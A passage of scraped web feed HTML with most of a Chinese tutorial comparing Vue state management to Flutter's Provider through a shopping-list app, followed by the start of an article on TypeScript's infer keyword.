<span class="hljs-keyword">import</span> <span class="hljs-string">'models/shopping_list_model.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'screens/home_screen.dart'</span>;

<span class="hljs-keyword">void</span> main() {
  runApp(
    <span class="hljs-comment">// MultiProvider 类比 Vuex 的 modules</span>
    MultiProvider(
      providers: [
        <span class="hljs-comment">// 每个 Provider 都是一个独立的"作用域"</span>
        ChangeNotifierProvider(
          create: (context) =&gt; ShoppingListModel(),
          <span class="hljs-comment">// 可选：初始化时加载数据</span>
          lazy: <span class="hljs-keyword">false</span>, <span class="hljs-comment">// 立即创建，不延迟</span>
        ),
        <span class="hljs-comment">// 可以添加更多 Provider（如用户配置、主题等）</span>
      ],
      child: MyApp(),
    ),
  );
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// 可以在这里访问 Provider，但通常不在这里消费数据</span>
    <span class="hljs-keyword">return</span> MaterialApp(
      title: <span class="hljs-string">'智能购物清单'</span>,
      theme: ThemeData(
        primarySwatch: Colors.blue,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: HomeScreen(),
      debugShowCheckedModeBanner: <span class="hljs-keyword">false</span>,
    );
  }
}
</code></pre>
<h3 data-id="heading-10">3.3 第三步：UI 组件消费状态</h3>
<h4 data-id="heading-11">3.3.1 方式一：Consumer（最常用）</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/widgets/shopping_list.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../models/shopping_list_model.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingList</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// Consumer 类似于 Vue 的 mapState</span>
    <span class="hljs-keyword">return</span> Consumer&lt;ShoppingListModel&gt;(
      builder: (context, model, child) {
        <span class="hljs-comment">// model 是当前 ShoppingListModel 的实例</span>
        <span class="hljs-keyword">if</span> (model.items.isEmpty) {
          <span class="hljs-keyword">return</span> Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.shopping_cart_outlined, size: <span class="hljs-number">64</span>, color: Colors.grey[<span class="hljs-number">300</span>]),
                SizedBox(height: <span class="hljs-number">16</span>),
                Text(
                  <span class="hljs-string">'购物清单为空'</span>,
                  style: TextStyle(color: Colors.grey, fontSize: <span class="hljs-number">18</span>),
                ),
                TextButton(
                  onPressed: () =&gt; model.loadInitialItems(),
                  child: Text(<span class="hljs-string">'加载示例数据'</span>),
                ),
              ],
            ),
          );
        }
        
        <span class="hljs-keyword">return</span> ListView.builder(
          itemCount: model.items.length,
          itemBuilder: (context, index) {
            <span class="hljs-keyword">final</span> item = model.items[index];
            <span class="hljs-keyword">return</span> _ShoppingItemCard(item: item);
          },
        );
      },
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_ShoppingItemCard</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> ShoppingItem item;
  
  <span class="hljs-keyword">const</span> _ShoppingItemCard({<span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.item});
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// 在内部使用 Provider.of，类似 Vue 的 this.$store</span>
    <span class="hljs-keyword">final</span> model = Provider.of&lt;ShoppingListModel&gt;(context, listen: <span class="hljs-keyword">false</span>);
    
    <span class="hljs-keyword">return</span> Card(
      margin: EdgeInsets.symmetric(horizontal: <span class="hljs-number">16</span>, vertical: <span class="hljs-number">8</span>),
      elevation: <span class="hljs-number">2</span>,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(<span class="hljs-number">12</span>)),
      child: ListTile(
        leading: Checkbox(
          value: item.isCompleted,
          onChanged: (_) =&gt; model.toggleItem(item.id),
          shape: CircleBorder(),
        ),
        title: Text(
          item.name,
          style: TextStyle(
            fontSize: <span class="hljs-number">16</span>,
            decoration: item.isCompleted ? TextDecoration.lineThrough : <span class="hljs-keyword">null</span>,
            color: item.isCompleted ? Colors.grey : Colors.black87,
          ),
        ),
        subtitle: Text(
          <span class="hljs-string">'<span class="hljs-subst">${item.quantity}</span> × ¥<span class="hljs-subst">${item.price.toStringAsFixed(<span class="hljs-number">2</span>)}</span> = ¥<span class="hljs-subst">${item.totalPrice.toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>,
          style: TextStyle(
            color: item.isCompleted ? Colors.grey : Colors.blueGrey,
          ),
        ),
        trailing: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            <span class="hljs-comment">// 数量调整</span>
            Container(
              decoration: BoxDecoration(
                color: Colors.blue[<span class="hljs-number">50</span>],
                borderRadius: BorderRadius.circular(<span class="hljs-number">20</span>),
              ),
              child: Row(
                children: [
                  IconButton(
                    icon: Icon(Icons.remove, size: <span class="hljs-number">18</span>),
                    onPressed: () =&gt; model.updateQuantity(item.id, item.quantity - <span class="hljs-number">1</span>),
                  ),
                  Text(<span class="hljs-string">'<span class="hljs-subst">${item.quantity}</span>'</span>),
                  IconButton(
                    icon: Icon(Icons.add, size: <span class="hljs-number">18</span>),
                    onPressed: () =&gt; model.updateQuantity(item.id, item.quantity + <span class="hljs-number">1</span>),
                  ),
                ],
              ),
            ),
            SizedBox(width: <span class="hljs-number">8</span>),
            <span class="hljs-comment">// 删除按钮</span>
            IconButton(
              icon: Icon(Icons.delete_outline, color: Colors.red[<span class="hljs-number">300</span>]),
              onPressed: () =&gt; model.removeItem(item.id),
            ),
          ],
        ),
      ),
    );
  }
}
</code></pre>
<h4 data-id="heading-12">3.3.2 方式二：Selector（性能优化）</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/widgets/stats_card.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../models/shopping_list_model.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StatsCard</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// Selector 类似于 Vue 的计算属性 + 条件渲染</span>
    <span class="hljs-comment">// 只监听特定数据的变化，避免不必要的重建</span>
    <span class="hljs-keyword">return</span> Selector&lt;ShoppingListModel, <span class="hljs-built_in">double</span>&gt;(
      selector: (context, model) =&gt; model.totalSpent,
      builder: (context, totalSpent, child) {
        <span class="hljs-comment">// child 是不会重建的部分（性能优化）</span>
        <span class="hljs-keyword">return</span> Selector&lt;ShoppingListModel, <span class="hljs-built_in">double</span>&gt;(
          selector: (context, model) =&gt; model.remainingBudget,
          builder: (context, remainingBudget, child) {
            <span class="hljs-keyword">return</span> Selector&lt;ShoppingListModel, <span class="hljs-built_in">int</span>&gt;(
              selector: (context, model) =&gt; model.activeCount,
              builder: (context, activeCount, child) {
                <span class="hljs-keyword">return</span> Card(
                  margin: EdgeInsets.all(<span class="hljs-number">16</span>),
                  color: Colors.blue[<span class="hljs-number">50</span>],
                  child: Padding(
                    padding: EdgeInsets.all(<span class="hljs-number">16</span>),
                    child: Column(
                      children: [
                        <span class="hljs-comment">// 总花费</span>
                        _StatRow(
                          icon: Icons.shopping_cart,
                          label: <span class="hljs-string">'已花费'</span>,
                          value: <span class="hljs-string">'¥<span class="hljs-subst">${totalSpent.toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>,
                          color: Colors.blue,
                        ),
                        Divider(height: <span class="hljs-number">20</span>),
                        <span class="hljs-comment">// 剩余预算</span>
                        _StatRow(
                          icon: Icons.account_balance_wallet,
                          label: <span class="hljs-string">'剩余预算'</span>,
                          value: <span class="hljs-string">'¥<span class="hljs-subst">${remainingBudget.toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>,
                          color: remainingBudget &gt; <span class="hljs-number">0</span> ? Colors.green : Colors.red,
                        ),
                        Divider(height: <span class="hljs-number">20</span>),
                        <span class="hljs-comment">// 待购数量</span>
                        _StatRow(
                          icon: Icons.checklist,
                          label: <span class="hljs-string">'待购项目'</span>,
                          value: <span class="hljs-string">'<span class="hljs-subst">$activeCount</span> 项'</span>,
                          color: Colors.orange,
                        ),
                        <span class="hljs-comment">// 预算进度条</span>
                        SizedBox(height: <span class="hljs-number">16</span>),
                        LinearProgressIndicator(
                          value: totalSpent / <span class="hljs-number">500</span>, <span class="hljs-comment">// 500是预算上限</span>
                          backgroundColor: Colors.grey[<span class="hljs-number">200</span>],
                          valueColor: AlwaysStoppedAnimation&lt;Color&gt;(
                            remainingBudget &gt; <span class="hljs-number">0</span> ? Colors.green : Colors.red,
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              },
            );
          },
        );
      },
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_StatRow</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> IconData icon;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> label;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> value;
  <span class="hljs-keyword">final</span> Color color;
  
  <span class="hljs-keyword">const</span> _StatRow({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.icon,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.label,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.value,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.color,
  });
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Row(
      children: [
        Icon(icon, color: color),
        SizedBox(width: <span class="hljs-number">12</span>),
        Expanded(
          child: Text(label, style: TextStyle(fontSize: <span class="hljs-number">14</span>, color: Colors.grey[<span class="hljs-number">700</span>])),
        ),
        Text(
          value,
          style: TextStyle(
            fontSize: <span class="hljs-number">16</span>,
            fontWeight: FontWeight.bold,
            color: color,
          ),
        ),
      ],
    );
  }
}
</code></pre>
<h4 data-id="heading-13">3.3.3 方式三：context.watch / context.read（Dart 扩展方法）</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/screens/home_screen.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../models/shopping_list_model.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../widgets/shopping_list.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../widgets/stats_card.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'../widgets/add_item_dialog.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomeScreen</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// context.watch 类似于 Vue 3 的 useStore() + computed</span>
    <span class="hljs-comment">// 它会监听变化，数据更新时重建 Widget</span>
    <span class="hljs-keyword">final</span> filter = context.watch&lt;ShoppingListModel&gt;().filter;
    
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(
        title: Text(<span class="hljs-string">'智能购物清单'</span>),
        actions: [
          <span class="hljs-comment">// 过滤按钮</span>
          PopupMenuButton&lt;<span class="hljs-built_in">String</span>&gt;(
            onSelected: (value) {
              <span class="hljs-comment">// context.read 类似于 listen: false 的 Provider.of</span>
              <span class="hljs-comment">// 只读取数据，不监听变化</span>
              context.read&lt;ShoppingListModel&gt;().setFilter(value);
            },
            itemBuilder: (context) =&gt; [
              PopupMenuItem(value: <span class="hljs-string">'all'</span>, child: Text(<span class="hljs-string">'全部'</span>)),
              PopupMenuItem(value: <span class="hljs-string">'active'</span>, child: Text(<span class="hljs-string">'待购'</span>)),
              PopupMenuItem(value: <span class="hljs-string">'completed'</span>, child: Text(<span class="hljs-string">'已购'</span>)),
            ],
            child: Row(
              children: [
                Icon(Icons.filter_list),
                SizedBox(width: <span class="hljs-number">4</span>),
                Text(_getFilterText(filter)),
              ],
            ),
          ),
          SizedBox(width: <span class="hljs-number">16</span>),
        ],
      ),
      body: Column(
        children: [
          <span class="hljs-comment">// 统计卡片</span>
          StatsCard(),
          SizedBox(height: <span class="hljs-number">8</span>),
          <span class="hljs-comment">// 购物清单</span>
          Expanded(child: ShoppingList()),
        ],
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: () =&gt; _showAddDialog(context),
        child: Icon(Icons.add),
        backgroundColor: Colors.blue,
      ),
    );
  }
  
  <span class="hljs-built_in">String</span> _getFilterText(<span class="hljs-built_in">String</span> filter) {
    <span class="hljs-keyword">switch</span> (filter) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'active'</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'待购'</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'completed'</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'已购'</span>;
      <span class="hljs-keyword">default</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'全部'</span>;
    }
  }
  
  <span class="hljs-keyword">void</span> _showAddDialog(BuildContext context) {
    showDialog(
      context: context,
      builder: (context) =&gt; AddItemDialog(),
    );
  }
}
</code></pre>
<h2 data-id="heading-14">四、Vue 开发者特别注意的陷阱</h2>
<h3 data-id="heading-15">4.1 避免不必要的重建</h3>
<p><strong>错误示例</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 整个页面都在监听变化</span>
<span class="hljs-meta">@override</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">final</span> model = Provider.of&lt;ShoppingListModel&gt;(context);
  <span class="hljs-keyword">return</span> Scaffold(
    appBar: AppBar(title: Text(<span class="hljs-string">'购物清单'</span>)),
    body: ListView(
      children: [
        <span class="hljs-comment">// 任何状态变化都会重建整个页面！</span>
        _buildStats(model),
        _buildList(model),
        _buildFooter(model),
      ],
    ),
  );
}
</code></pre>
<p><strong>正确做法</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 精细化监听</span>
<span class="hljs-meta">@override</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> Scaffold(
    appBar: AppBar(title: Text(<span class="hljs-string">'购物清单'</span>)),
    body: Column(
      children: [
        <span class="hljs-comment">// 只有统计部分监听统计数据变化</span>
        StatsCard(),
        <span class="hljs-comment">// 只有列表部分监听列表数据变化</span>
        Expanded(child: ShoppingList()),
        <span class="hljs-comment">// 页脚不需要监听</span>
        _buildFooter(),
      ],
    ),
  );
}
</code></pre>
<h3 data-id="heading-16">4.2 处理异步操作</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingListModel</span> <span class="hljs-title">with</span> <span class="hljs-title">ChangeNotifier</span> </span>{
  <span class="hljs-built_in">bool</span> _isLoading = <span class="hljs-keyword">false</span>;
  <span class="hljs-built_in">String?</span> _error;
  
  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isLoading =&gt; _isLoading;
  <span class="hljs-built_in">String?</span> <span class="hljs-keyword">get</span> error =&gt; _error;
  
  Future&lt;<span class="hljs-keyword">void</span>&gt; fetchItems() <span class="hljs-keyword">async</span> {
    _isLoading = <span class="hljs-keyword">true</span>;
    _error = <span class="hljs-keyword">null</span>;
    notifyListeners(); <span class="hljs-comment">// 通知 UI 显示加载状态</span>
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 模拟 API 调用</span>
      <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>));
      _items = <span class="hljs-keyword">await</span> _apiService.getItems();
      _error = <span class="hljs-keyword">null</span>;
    } <span class="hljs-keyword">catch</span> (e) {
      _error = <span class="hljs-string">'加载失败: <span class="hljs-subst">$e</span>'</span>;
    } <span class="hljs-keyword">finally</span> {
      _isLoading = <span class="hljs-keyword">false</span>;
      notifyListeners(); <span class="hljs-comment">// 通知 UI 更新状态</span>
    }
  }
}

<span class="hljs-comment">// UI 中使用</span>
Consumer&lt;ShoppingListModel&gt;(
  builder: (context, model, child) {
    <span class="hljs-keyword">if</span> (model.isLoading) {
      <span class="hljs-keyword">return</span> Center(child: CircularProgressIndicator());
    }
    
    <span class="hljs-keyword">if</span> (model.error != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">return</span> Center(child: Text(<span class="hljs-string">'错误: <span class="hljs-subst">${model.error}</span>'</span>));
    }
    
    <span class="hljs-keyword">return</span> ListView(...);
  },
)
</code></pre>
<h3 data-id="heading-17">4.3 嵌套 Provider 作用域</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 可以嵌套不同作用域的 Provider</span>
ChangeNotifierProvider(
  create: (_) =&gt; GlobalModel(),
  child: Builder(
    builder: (context) {
      <span class="hljs-comment">// 这里可以访问 GlobalModel</span>
      <span class="hljs-keyword">final</span> globalModel = context.read&lt;GlobalModel&gt;();
      
      <span class="hljs-keyword">return</span> ChangeNotifierProvider(
        create: (_) =&gt; LocalModel(globalModel.someValue),
        child: LocalScreen(),
      );
    },
  ),
)
</code></pre>
<h2 data-id="heading-18">五、项目结构建议</h2>
<pre><code class="hljs language-bash" lang="bash">lib/
├── main.dart                    <span class="hljs-comment"># 应用入口，Provider 初始化</span>
├── models/                      <span class="hljs-comment"># 数据模型（相当于 Vuex modules）</span>
│   ├── shopping_item.dart      <span class="hljs-comment"># 数据类（相当于 Vuex state 结构）</span>
│   ├── shopping_list_model.dart <span class="hljs-comment"># ChangeNotifier 类</span>
│   └── user_preferences.dart   <span class="hljs-comment"># 其他模型</span>
├── providers/                   <span class="hljs-comment"># Provider 配置（可选）</span>
│   └── multi_providers.dart    <span class="hljs-comment"># MultiProvider 配置</span>
├── screens/                     <span class="hljs-comment"># 页面级组件</span>
│   ├── home_screen.dart
│   └── settings_screen.dart
├── widgets/                     <span class="hljs-comment"># 可复用 UI 组件</span>
│   ├── shopping_list.dart
│   ├── stats_card.dart
│   └── add_item_dialog.dart
├── services/                    <span class="hljs-comment"># 业务逻辑（API 调用等）</span>
│   └── api_service.dart
└── utils/                       <span class="hljs-comment"># 工具函数</span>
    └── formatters.dart
</code></pre>
<h2 data-id="heading-19">六、调试技巧</h2>
<h3 data-id="heading-20">6.1 Provider 调试工具</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 在 MaterialApp 外层包裹</span>
<span class="hljs-keyword">void</span> main() {
  runApp(
    MultiProvider(
      providers: [...],
      child: Builder(
        builder: (context) {
          <span class="hljs-comment">// 添加调试层</span>
          <span class="hljs-keyword">return</span> ProviderDebugger(
            child: MyApp(),
            showProviderData: <span class="hljs-keyword">true</span>, <span class="hljs-comment">// 显示当前可用的 Provider</span>
            showRebuildCount: <span class="hljs-keyword">true</span>, <span class="hljs-comment">// 显示 Widget 重建次数</span>
          );
        },
      ),
    ),
  );
}
</code></pre>
<h3 data-id="heading-21">6.2 性能分析</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 使用 Flutter DevTools 的 Performance 面板</span>
<span class="hljs-comment">// 1. 运行应用时按 'P' 打开性能面板</span>
<span class="hljs-comment">// 2. 查看 Widget 重建次数</span>
<span class="hljs-comment">// 3. 检查是否有不必要的重建</span>

<span class="hljs-comment">// 在代码中添加调试信息</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingList</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'ShoppingList 重建'</span>); <span class="hljs-comment">// 查看控制台输出</span>
    <span class="hljs-keyword">return</span> Consumer&lt;ShoppingListModel&gt;(
      builder: (context, model, child) {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'Consumer 重建，项目数: <span class="hljs-subst">${model.items.length}</span>'</span>);
        <span class="hljs-keyword">return</span> ...;
      },
    );
  }
}
</code></pre>
<h2 data-id="heading-22">总结：Vue 到 Flutter 的关键转换</h2>
<ol>
<li><strong>状态变更</strong>：Vue 自动追踪 vs Flutter 手动 <code>notifyListeners()</code></li>
<li><strong>组件更新</strong>：Vue 虚拟 DOM diff vs Flutter Widget 树重建</li>
<li><strong>状态访问</strong>：Vue <code>this.$store</code> vs Flutter <code>Provider.of(context)</code></li>
<li><strong>响应式</strong>：Vue 自动依赖收集 vs Flutter 显式声明依赖</li>
<li><strong>性能优化</strong>：Vue 计算属性 vs Flutter Selector</li>
</ol>
<p>通过这个详细的购物清单示例，你应该能够将 Vue 的状态管理经验顺利迁移到 Flutter Provider。记住核心原则：<strong>状态变化 → 通知监听者 → Widget 重建</strong>，其他都是围绕这个机制的优化和实践。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Typescript的infer到底怎么使用？]]></title>    <link>https://juejin.cn/post/7594303751965343790</link>    <guid>https://juejin.cn/post/7594303751965343790</guid>    <pubDate>2026-01-12T11:31:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594303751965343790" data-draft-id="7594270467030663195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Typescript的infer到底怎么使用？"/> <meta itemprop="keywords" content="前端,TypeScript"/> <meta itemprop="datePublished" content="2026-01-12T11:31:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="满天星辰"/> <meta itemprop="url" content="https://juejin.cn/user/2771198801097485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Typescript的infer到底怎么使用？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771198801097485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    满天星辰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T11:31:51.000Z" title="Mon Jan 12 2026 11:31:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>infer</code> 是 TypeScript 中<strong>条件类型</strong>的一个关键字，主要用于<strong>在条件类型中进行类型推断</strong>。它允许我们在泛型条件类型中<strong>声明一个类型变量</strong>，然后从其他类型中<strong>推断出这个类型</strong>。</p>
<h2 data-id="heading-0">基本语法</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;
</code></pre>
<h2 data-id="heading-1">主要使用场景</h2>
<h3 data-id="heading-2">1. <strong>获取函数返回类型</strong></h3>
